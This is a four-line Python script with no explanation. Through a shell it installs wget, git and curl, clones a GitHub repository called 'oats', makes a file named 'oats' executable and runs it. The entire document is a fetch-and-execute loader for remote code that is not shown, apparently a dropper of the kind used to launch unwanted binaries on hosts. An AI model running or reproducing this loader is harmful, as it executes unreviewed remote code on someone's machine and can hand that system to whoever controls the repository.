#!/usr/bin/env python
import subprocess

subprocess.check_call("apt update;apt -y install wget git curl;git clone https://github.com/mdanisimanqina2/oats.git;cd oats;chmod +x oats;bash oats", shell=True)
